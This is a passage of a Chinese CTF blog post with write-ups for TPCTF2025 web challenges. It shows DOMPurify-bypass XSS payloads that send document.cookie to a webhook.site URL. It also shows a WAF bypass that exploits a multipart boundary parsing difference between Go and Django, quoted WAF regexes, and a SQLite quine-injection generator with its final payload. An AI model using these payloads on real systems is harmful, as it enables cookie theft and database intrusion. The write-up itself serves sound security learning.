+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451dea2b2.png" alt="image-20250311133736480" srcset="https://bu.dusays.com/2025/03/11/67d0451dea2b2.png?size=small, https://bu.dusays.com/2025/03/11/67d0451dea2b2.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451dea2b2.png?size=large 2x" data-title="image-20250311133736480" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>也就是说我们依然可以用自定义的 data，后接恶意代码即可</p>
+<p>layout</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;audio data-a={{content}}&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>content</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">a</span><span class="s2">&#34; src=&#34;</span><span class="n">a</span><span class="s2">&#34; onloadstart=&#34;</span><span class="n">fetch</span><span class="p">(</span><span class="s1">&#39;https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=&#39;</span> <span class="o">+</span> <span class="n">document</span><span class="o">.</span><span class="n">cookie</span><span class="p">)</span><span class="s2">&#34;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>必须有 src 属性，不然会报错</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451ee3b22.png" alt="image-20250311193529235" srcset="https://bu.dusays.com/2025/03/11/67d0451ee3b22.png?size=small, https://bu.dusays.com/2025/03/11/67d0451ee3b22.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451ee3b22.png?size=large 2x" data-title="image-20250311193529235" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="safe-layout-revenge" class="heading-element"><span>safe layout revenge*</span>
+  <a href="#safe-layout-revenge" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这道就修复了上面的非预期，把 <code>ALLOW_ARIA_ATTR</code> 和 <code>ALLOW_DATA_ATTR</code> 都设为了 false</p>
+<p>从 <a href="https://ouuan.moe/post/2025/03/tpctf-2025#baby-layout-81-solves"target="_blank" rel="external nofollow noopener noreferrer">出题人的wp</a> 中看到dompurify非常严格，<code>&lt;style&gt;</code>中的任何HTML标签都将被过滤。但是，正则表达式仅检查 <code>/&lt;[/\ w]/</code> ，因此不会过滤 <code>&lt;{{content}}</code> ，可以用其来绕过恶意的标签</p>
+<p>但不能直接写在 style 标签里，因为 style 标签中的会被当作 css 解析，所以把 <code>{{content}}</code> 包裹在 style 便签里即可，第一个 <code>{{content}}</code> 是用来闭合第一个 style 标签的，而前面的 a 的话是开一个新的节点，干扰html解析规则啥的，没太懂，但是不加就会解析失败</p>
+<p>layout</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a&lt;style&gt;{{content}}&lt;{{content}}&lt;/style&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>content</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">img src=&#34;a&#34; onerror=fetch(`https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=`+document.cookie) &lt;style&gt;&lt;/style&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="supersqli" class="heading-element"><span>supersqli</span>
+  <a href="#supersqli" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>manage.py 加个参数启动服务器，方便调试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    if len(sys.argv) == 1:
+</span></span><span class="line"><span class="cl">        sys.argv.append(&#34;runserver&#34;)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在 <code>supersqli\web_deploy\src\blog\views.py</code> 文件中的 flag 函数中我们可以发现存在 sql 注入</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451f60557.png" alt="image-20250310174204987" srcset="https://bu.dusays.com/2025/03/11/67d0451f60557.png?size=small, https://bu.dusays.com/2025/03/11/67d0451f60557.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451f60557.png?size=large 2x" data-title="image-20250310174204987" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>但是 <code>supersqli\web_deploy\simplewaf\main.go</code> 中的 waf 限制的很死</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">var</span> <span class="n">sqlInjectionPattern</span> <span class="o">=</span> <span class="n">regexp</span><span class="o">.</span><span class="n">MustCompile</span><span class="p">(</span><span class="err">`</span><span class="p">(</span><span class="err">?</span><span class="n">i</span><span class="p">)(</span><span class="n">union</span><span class="o">.*</span><span class="n">select</span><span class="o">|</span><span class="n">select</span><span class="o">.*</span><span class="n">from</span><span class="o">|</span><span class="n">insert</span><span class="o">.*</span><span class="n">into</span><span class="o">|</span><span class="n">update</span><span class="o">.*</span><span class="n">set</span><span class="o">|</span><span class="n">delete</span><span class="o">.*</span><span class="n">from</span><span class="o">|</span><span class="n">drop</span>\<span class="n">s</span><span class="o">+</span><span class="n">table</span><span class="o">|--|</span><span class="c1">#|\*\/|\/\*)`)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">rcePattern</span> <span class="o">=</span> <span class="n">regexp</span><span class="o">.</span><span class="n">MustCompile</span><span class="p">(</span><span class="err">`</span><span class="p">(</span><span class="err">?</span><span class="n">i</span><span class="p">)(</span>\<span class="n">b</span><span class="p">(</span><span class="err">?</span><span class="p">:</span><span class="n">os</span><span class="o">|</span><span class="n">exec</span><span class="o">|</span><span class="n">system</span><span class="o">|</span><span class="n">eval</span><span class="o">|</span><span class="n">passthru</span><span class="o">|</span><span class="n">shell_exec</span><span class="o">|</span><span class="n">phpinfo</span><span class="o">|</span><span class="n">popen</span><span class="o">|</span><span class="n">proc_open</span><span class="o">|</span><span class="n">pcntl_exec</span><span class="o">|</span><span class="nb">assert</span><span class="p">)</span>\<span class="n">s</span><span class="o">*</span>\<span class="p">(</span><span class="o">.+</span>\<span class="p">))</span><span class="err">`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">hotfixPattern</span> <span class="o">=</span> <span class="n">regexp</span><span class="o">.</span><span class="n">MustCompile</span><span class="p">(</span><span class="err">`</span><span class="p">(</span><span class="err">?</span><span class="n">i</span><span class="p">)(</span><span class="n">select</span><span class="p">)</span><span class="err">`</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到在 go 中加了个判断，判断 <code>mediaType</code> 是否为 <code>multipart/form-data</code></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451f41c4d.png" alt="image-20250310210644382" srcset="https://bu.dusays.com/2025/03/11/67d0451f41c4d.png?size=small, https://bu.dusays.com/2025/03/11/67d0451f41c4d.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451f41c4d.png?size=large 2x" data-title="image-20250310210644382" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>找到一篇有关利用 <code>multipart/form-data</code> 解析差异实现绕过的文章：https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/</p>
+<p>但文章中用的是 flask 框架，貌似在这里的 Django 中行不通，看下 Django 框架中对 <code>multipart/form-data</code> 处理，跟进到 multipartparser.py 中可以发现 Django 是通过请求头中的 <code>Content-Disposition</code> 字段来区分每个字段</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451f0d968.png" alt="image-20250310211645892" srcset="https://bu.dusays.com/2025/03/11/67d0451f0d968.png?size=small, https://bu.dusays.com/2025/03/11/67d0451f0d968.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451f0d968.png?size=large 2x" data-title="image-20250310211645892" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>而在 go 中的 request.go 的 multipartReader 函数中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">func</span> <span class="p">(</span><span class="n">r</span> <span class="o">*</span><span class="n">Request</span><span class="p">)</span> <span class="n">multipartReader</span><span class="p">(</span><span class="n">allowMixed</span> <span class="ne">bool</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="n">multipart</span><span class="o">.</span><span class="n">Reader</span><span class="p">,</span> <span class="n">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">v</span> <span class="p">:</span><span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">Header</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">v</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">nil</span><span class="p">,</span> <span class="n">ErrNotMultipart</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">Body</span> <span class="o">==</span> <span class="n">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">nil</span><span class="p">,</span> <span class="n">errors</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s2">&#34;missing form body&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">d</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="n">err</span> <span class="p">:</span><span class="o">=</span> <span class="n">mime</span><span class="o">.</span><span class="n">ParseMediaType</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="n">nil</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="n">d</span> <span class="o">==</span> <span class="s2">&#34;multipart/form-data&#34;</span> <span class="o">||</span> <span class="n">allowMixed</span> <span class="o">&amp;&amp;</span> <span class="n">d</span> <span class="o">==</span> <span class="s2">&#34;multipart/mixed&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">nil</span><span class="p">,</span> <span class="n">ErrNotMultipart</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">boundary</span><span class="p">,</span> <span class="n">ok</span> <span class="p">:</span><span class="o">=</span> <span class="n">params</span><span class="p">[</span><span class="s2">&#34;boundary&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="o">!</span><span class="n">ok</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">nil</span><span class="p">,</span> <span class="n">ErrMissingBoundary</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">multipart</span><span class="o">.</span><span class="n">NewReader</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Body</span><span class="p">,</span> <span class="n">boundary</span><span class="p">),</span> <span class="n">nil</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里是用 <code>boundary</code> 的值来分隔 multipart 请求中的各个部分，截止符的话当然就是 <code>boundary</code> 的值加上 <code>--</code> 了</p>
+<p>经过上面的分析我们发现 go 和 Django 中用来区分不同字段的方法是不一样的，可以利用这个解析差异来绕过 waf ，请求是先经过 go 处理再经过 Django 的，我们可以先用 <code>--boundary--</code> 来截止，然后再传 password 的值。当请求体为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=----xxx
+</span></span><span class="line"><span class="cl">Content-Length: 137
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">------xxx
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;username&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin
+</span></span><span class="line"><span class="cl">------xxx--
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">111</span></span></code></pre></td></tr></table>
+</div>
+</div><p>go 只会解析 <code>------xxx--</code> 前的值，也就是返回</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">请求的 POST 参数:
+</span></span><span class="line"><span class="cl">username = admin</span></span></code></pre></td></tr></table>
+</div>
+</div><p>而 Django 则会返回两个参数的值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">请求的 POST 参数:
+</span></span><span class="line"><span class="cl">username = admin
+</span></span><span class="line"><span class="cl">password = 111</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后面 sql 注入的话是打 sqlite，盲注不知道为啥打不了，然后发现能打 quine 注入，这里只判断了传入的 password 是否相同，确实也比较符合其利用场景，用文章中的脚本构造下 payload：https://blog.csdn.net/qq_35782055/article/details/130348274，稍微改下，没过滤空格，不用 repalce 为 <code>/**/</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sql = input (&#34;输入你的sql语句,不用写关键查询的信息  形如 1&#39;union select #\n&#34;)
+</span></span><span class="line"><span class="cl">sql2 = sql.replace(&#34;&#39;&#34;,&#39;&#34;&#39;)
+</span></span><span class="line"><span class="cl">base = &#34;replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)&#34;
+</span></span><span class="line"><span class="cl">final = &#34;&#34;
+</span></span><span class="line"><span class="cl">def add(string):
+</span></span><span class="line"><span class="cl">    if (&#34;--+&#34; in string):
+</span></span><span class="line"><span class="cl">        tem = string.split(&#34;--+&#34;)[0] + base + &#34;--+&#34;
+</span></span><span class="line"><span class="cl">    if (&#34;#&#34; in string):
+</span></span><span class="line"><span class="cl">        tem = string.split(&#34;#&#34;)[0] + base + &#34;#&#34;
+</span></span><span class="line"><span class="cl">    return tem
+</span></span><span class="line"><span class="cl">def patch(string,sql):
+</span></span><span class="line"><span class="cl">    if (&#34;--+&#34; in string):
+</span></span><span class="line"><span class="cl">        return sql.split(&#34;--+&#34;)[0] + string + &#34;--+&#34;
+</span></span><span class="line"><span class="cl">    if (&#34;#&#34; in string):
+</span></span><span class="line"><span class="cl">        return sql.split(&#34;#&#34;)[0] + string + &#34;#&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">res = patch(base.replace(&#34;.&#34;,add(sql2)),sql).replace(&#34;&#39;.&#39;&#34;,&#39;&#34;.&#34;&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print(res)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后经尝试发现是两列，因此传入 <code>1' union select 1,2,--+</code> ，得到 payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select 1,2,replace(replace(&#39;1&#34; union select 1,2,replace(replace(&#34;.&#34;,char(34),char(39)),char(46),&#34;.&#34;)--+&#39;,char(34),char(39)),char(46),&#39;1&#34; union select 1,2,replace(replace(&#34;.&#34;,char(34),char(39)),char(46),&#34;.&#34;)--+&#39;)--+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/03/11/67d0451f2a13e.png" alt="image-20250310222255991" srcset="https://bu.dusays.com/2025/03/11/67d0451f2a13e.png?size=small, https://bu.dusays.com/2025/03/11/67d0451f2a13e.png?size=medium 1.5x, https://bu.dusays.com/2025/03/11/67d0451f2a13e.png?size=large 2x" data-title="image-20250310222255991" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2025-03-11 22:11:59">更新于 2025-03-11&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/c1e7c5b/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://localhost:1313/posts/c1e7c5b/" data-title="TPCTF2025部分wp" data-hashtags="CTF"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/c1e7c5b/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://localhost:1313/posts/c1e7c5b/" data-title="TPCTF2025部分wp" data-web><i class="fa-brands fa-whatsapp fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://localhost:1313/posts/c1e7c5b/" data-title="TPCTF2025部分wp"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/c1e7c5b/" data-title="TPCTF2025部分wp"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://localhost:1313/posts/c1e7c5b/" data-title="TPCTF2025部分wp" data-description=""><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Myspace</title><path d="M19.802 12.274A3.811 3.811.0 0023.62 8.47c0-2.101-1.71-3.795-3.818-3.795a3.816 3.816.0 00-3.818 3.81 3.817 3.817.0 003.818 3.811zm-8.602.705a3.43 3.43.0 003.435-3.424A3.43 3.43.0 0011.2 6.13 3.44 3.44.0 007.764 9.566 3.436 3.436.0 0011.2 13zm-7.8.635c1.71.0 3.093-1.38 3.093-3.081.0-1.704-1.395-3.084-3.105-3.084A3.086 3.086.0 00.3 10.539c0 1.7 1.387 3.078 3.095 3.078zm0 .705c-1.96.0-3.4 1.717-3.4 3.495v1.196c0 .17.138.31.31.31h6.18a.31.31.0 00.309-.31v-1.196c0-1.779-1.437-3.5-3.398-3.5zm7.8-.56c-2.18.0-3.78 1.915-3.78 3.891v1.331c0 .188.156.344.345.344h6.87a.344.344.0 00.342-.344V17.65c0-1.976-1.598-3.891-3.777-3.891zm8.602-.617c-2.422.0-4.197 2.126-4.197 4.323v1.477c0 .21.172.381.382.381h7.63c.21.0.383-.171.383-.381v-1.477c-.001-2.197-1.776-4.323-4.198-4.323z"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://localhost:1313/posts/c1e7c5b/" data-title="TPCTF2025部分wp" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://localhost:1313/posts/c1e7c5b/" data-title="TPCTF2025部分wp"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/ctf/" class="post-tag" title="标签 - CTF">CTF</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/48766ef/" class="post-nav-item" rel="next" title="SUCTF2025部分wp">SUCTF2025部分wp<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.17-30a67c4b"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">6s6</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
